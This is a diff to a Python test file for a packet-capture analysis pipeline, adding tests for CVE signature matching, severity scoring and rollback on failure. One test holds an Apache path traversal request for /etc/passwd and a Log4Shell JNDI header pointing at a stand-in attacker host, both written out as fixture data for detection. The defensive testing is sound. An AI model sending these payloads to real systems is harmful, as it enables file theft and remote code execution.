@@ -20,19 +20,24 @@ from models.node import MonitoredNode
 from models.pcap_analysis import (
     PcapAnalysisRuns,
     PcapArtifacts,
+    PcapCveMatches,
     PcapFlows,
     PcapIocAllowlist,
     PcapIocs,
+    PcapSeverityScores,
     TcpSessions,
 )
 from workers.pcap_pipeline import (
     _read_pure_python_packets,
+    handle_chain_failure,
     normalize_flow_key,
     open_decompressed_pcap,
     pcap_analysis_extract_artifacts,
     pcap_analysis_extract_flows,
     pcap_analysis_extract_iocs,
+    pcap_analysis_match_cve,
     pcap_analysis_reconstruct_sessions,
+    pcap_analysis_score_severity,
     pcap_analysis_validate,
     start_pcap_analysis,
 )
@@ -802,12 +807,14 @@ def test_ioc_extraction_flows_and_artifacts(tmp_path, monkeypatch):
 def test_ioc_allowlist_custom_entry(tmp_path, monkeypatch):
     """Custom allowlist entry suppresses matching partner domain IOC."""
     monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
+    partner_id = uuid4().hex[:6]
+    partner_domain = f"partner-{partner_id}.com"
 
     with get_sync_session() as session:
         # Add custom allowlist pattern
         custom_rule = PcapIocAllowlist(
             ioc_type="domain",
-            pattern="*.trusted-partner.com",
+            pattern=f"*.{partner_domain}",
             description="Verified partner organization",
         )
         session.add(custom_rule)
@@ -844,7 +851,7 @@ def test_ioc_allowlist_custom_entry(tmp_path, monkeypatch):
             run_id=run_id,
             evidence_id=ev.id,
             artifact_type="tls_client_hello",
-            metadata_json={"sni": "api.trusted-partner.com"},
+            metadata_json={"sni": f"api.{partner_domain}"},
             size_bytes=80,
         )
         session.add(art)
@@ -858,10 +865,233 @@ def test_ioc_allowlist_custom_entry(tmp_path, monkeypatch):
         ioc = session.execute(
             select(PcapIocs).where(
                 PcapIocs.run_id == run_id,
-                PcapIocs.ioc_value == "api.trusted-partner.com",
+                PcapIocs.ioc_value == f"api.{partner_domain}",
             )
         ).scalar_one()
         assert ioc.is_allowlisted is True
         assert "Verified partner organization" in str(ioc.threat_intel_match)
+
+
+def test_cve_matching_log4j_and_path_traversal(tmp_path, monkeypatch):
+    """Scan HTTP artifacts for known Log4Shell and Apache path traversal signatures."""
+    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
+
+    with get_sync_session() as session:
+        node = MonitoredNode(hostname="test-node-cve", collector_url="http://127.0.0.1:20000", active=True)
+        session.add(node)
+        session.flush()
+        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
+        session.add(inv)
+        session.flush()
+        ev = InvestigationEvidence(
+            investigation_id=inv.id,
+            node_id=node.id,
+            evidence_type="pcap_collection",
+            file_name="cve.pcap",
+            storage_key="cve.pcap",
+            status="complete",
+        )
+        session.add(ev)
+        session.flush()
+        run_id = uuid4().hex
+        run = PcapAnalysisRuns(
+            run_id=run_id,
+            evidence_id=ev.id,
+            investigation_id=inv.id,
+            node_id=node.id,
+            status="running",
+            current_step="extract_iocs",
+        )
+        session.add(run)
+        session.flush()
+
+        # Artifact 1: Apache 2.4.49 path traversal attempt
+        art1 = PcapArtifacts(
+            run_id=run_id,
+            evidence_id=ev.id,
+            artifact_type="http_request",
+            metadata_json={"uri": "/cgi-bin/.%2e/.%2e/.%2e/etc/passwd", "headers": {"host": "vulnerable-srv.org"}, "method": "GET"},
+            size_bytes=90,
+        )
+        # Artifact 2: Log4Shell injection header
+        art2 = PcapArtifacts(
+            run_id=run_id,
+            evidence_id=ev.id,
+            artifact_type="http_request",
+            metadata_json={"uri": "/login", "headers": {"user-agent": "${jndi:ldap://c2.attacker.net:1389/Exploit}"}, "method": "POST"},
+            size_bytes=120,
+        )
+        session.add_all([art1, art2])
+        session.commit()
+        ev_id = ev.id
+
+    res = pcap_analysis_match_cve(ev_id, run_id=run_id)
+    assert res["status"] == "complete"
+    assert res["cve_match_count"] >= 2
+
+    with get_sync_session() as session:
+        cves = session.execute(
+            select(PcapCveMatches).where(PcapCveMatches.run_id == run_id)
+        ).scalars().all()
+
+        cve_map = {c.cve_id: c for c in cves}
+        assert "CVE-2021-41773" in cve_map
+        assert cve_map["CVE-2021-41773"].severity == "high"
+
+        assert "CVE-2021-44228" in cve_map
+        assert float(cve_map["CVE-2021-44228"].cvss_score) == 10.0
+        assert cve_map["CVE-2021-44228"].severity == "critical"
+
+
+def test_severity_scoring_composite(tmp_path, monkeypatch):
+    """Compute overall severity score and factors breakdown from CVEs, IOCs, and anomaly metrics."""
+    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
+
+    with get_sync_session() as session:
+        node = MonitoredNode(hostname="test-node-score", collector_url="http://127.0.0.1:20000", active=True)
+        session.add(node)
+        session.flush()
+        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
+        session.add(inv)
+        session.flush()
+        ev = InvestigationEvidence(
+            investigation_id=inv.id,
+            node_id=node.id,
+            evidence_type="pcap_collection",
+            file_name="score.pcap",
+            storage_key="score.pcap",
+            status="complete",
+        )
+        session.add(ev)
+        session.flush()
+        run_id = uuid4().hex
+        run = PcapAnalysisRuns(
+            run_id=run_id,
+            evidence_id=ev.id,
+            investigation_id=inv.id,
+            node_id=node.id,
+            status="running",
+            current_step="match_cve",
+        )
+        session.add(run)
+        session.flush()
+
+        # Add a critical CVE
+        cve = PcapCveMatches(
+            run_id=run_id,
+            evidence_id=ev.id,
+            cve_id="CVE-2021-44228",
+            cvss_score=10.0,
+            severity="critical",
+            match_type="payload_signature",
+            confidence="high",
+            description="Log4Shell",
+        )
+        session.add(cve)
+
+        # Add public un-allowlisted IOC
+        ioc = PcapIocs(
+            run_id=run_id,
+            evidence_id=ev.id,
+            ioc_type="ipv4",
+            ioc_value="198.51.100.44",
+            is_allowlisted=False,
+        )
+        session.add(ioc)
+
+        # Add a session
+        sess = TcpSessions(
+            run_id=run_id,
+            evidence_id=ev.id,
+            src_ip="192.168.1.10",
+            dst_ip="198.51.100.44",
+            src_port=45000,
+            dst_port=443,
+            state="established",
+            snaplen=65535,
+            total_bytes=1000,
+            reassembled_bytes=1000,
+            first_seen=datetime.now(timezone.utc),
+            last_seen=datetime.now(timezone.utc),
+        )
+        session.add(sess)
+        session.commit()
+        ev_id = ev.id
+
+    res = pcap_analysis_score_severity(ev_id, run_id=run_id)
+    assert res["status"] == "complete"
+    assert res["overall_score"] >= 5.0
+
+    with get_sync_session() as session:
+        score = session.execute(
+            select(PcapSeverityScores).where(PcapSeverityScores.run_id == run_id)
+        ).scalar_one()
+        assert float(score.cvss_base_max) == 10.0
+        assert score.overall_severity in ("medium", "high", "critical")
+        assert "cvss_base_max" in score.factors
+
+        updated_run = session.execute(
+            select(PcapAnalysisRuns).where(PcapAnalysisRuns.run_id == run_id)
+        ).scalar_one()
+        assert updated_run.status == "complete"
+        assert updated_run.completed_at is not None
+
+
+def test_resiliency_rollback_purges_staging(tmp_path, monkeypatch):
+    """Pipeline failure triggers rollback handler which purges disk staging prefix and updates status."""
+    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
+    storage = get_storage_backend()
+
+    with get_sync_session() as session:
+        node = MonitoredNode(hostname="test-node-rollback", collector_url="http://127.0.0.1:20000", active=True)
+        session.add(node)
+        session.flush()
+        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
+        session.add(inv)
+        session.flush()
+        ev = InvestigationEvidence(
+            investigation_id=inv.id,
+            node_id=node.id,
+            evidence_type="pcap_collection",
+            file_name="rollback.pcap",
+            storage_key="rollback.pcap",
+            status="complete",
+        )
+        session.add(ev)
+        session.flush()
+        run_id = uuid4().hex
+        run = PcapAnalysisRuns(
+            run_id=run_id,
+            evidence_id=ev.id,
+            investigation_id=inv.id,
+            node_id=node.id,
+            status="running",
+            current_step="extract_artifacts",
+        )
+        session.add(run)
+        session.commit()
+        ev_id = ev.id
+
+    # Create dummy staged file under prefix analysis-{run_id}
+    staging_prefix = f"analysis-{run_id}"
+    storage_key, _ = storage.save_artifact(staging_prefix, b"transient_evidence_content", "bin")
+    staged_file = storage.root / storage_key
+    assert staged_file.is_file()
+
+    # Invoke rollback handler
+    handle_chain_failure(None, Exception("Simulated fatal parser crash"), run_id=run_id, evidence_id=ev_id)
+
+    # Staged file should be wiped
+    assert not staged_file.exists()
+
+    with get_sync_session() as session:
+        updated_run = session.execute(
+            select(PcapAnalysisRuns).where(PcapAnalysisRuns.run_id == run_id)
+        ).scalar_one()
+        assert updated_run.status == "rolled_back"
+        assert updated_run.rollback_started_at is not None
+        assert updated_run.rollback_completed_at is not None
+        assert "Simulated fatal parser crash" in (updated_run.error_message or "")
+
 
 
